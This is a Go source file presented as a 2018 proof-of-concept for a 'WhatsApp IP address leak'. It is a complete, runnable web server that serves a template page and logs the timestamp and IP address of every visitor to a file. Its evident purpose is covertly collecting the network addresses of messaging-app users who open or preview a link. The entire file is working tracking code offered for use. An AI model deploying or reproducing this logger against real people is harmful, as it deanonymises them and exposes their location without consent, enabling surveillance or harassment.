/*
// WhatsApp IP address leak.
// Proof-of-Concept.
//
// Usage: make build
//
// Use of this source code is governed by a MIT-style
// license that can be found in the LICENSE file.
// Mark M. 2018.
*/
package main

import (
	"fmt"
	"html/template"
	"log"
	"net"
	"net/http"
	"os"
	"time"
)

type LeakData struct {
	Timestamp string
	IP        string
}

var Log *log.Logger

func logToFile(logPath string) {
	file, err := os.OpenFile(logPath, os.O_RDWR|os.O_CREATE|os.O_APPEND, 0644)
	if err != nil {
		panic(err)
	}
	Log = log.New(file, "", 0)
}

func leakIP(w http.ResponseWriter, r *http.Request) {
	var Data LeakData

	form := template.Must(template.ParseFiles("index.html"))

	Data.Timestamp = time.Now().Format("02/01/2006 15:04:05")
	Data.IP, _, _ = net.SplitHostPort(r.RemoteAddr)

	form.Execute(w, Data)

	if _, ok := os.LookupEnv("DOCKER"); ok {
		fmt.Printf("%s - %s\n", Data.Timestamp, Data.IP)
	} else {
		Log.Printf("%s - %s", Data.Timestamp, Data.IP)
	}
}

func favicon(w http.ResponseWriter, r *http.Request) {
	// Empty handler for favicon.ico requests
	// Will be useful later
}

func main() {
	var server http.Server

	if value, ok := os.LookupEnv("W_LEAK_PORT"); ok {
		server.Addr = ":" + value
	} else {
		server.Addr = ":8080"
	}

	logToFile("visitors.log")

	http.HandleFunc("/", leakIP)
	http.HandleFunc("/favicon.ico", favicon)

	log.Fatal(server.ListenAndServe())
}
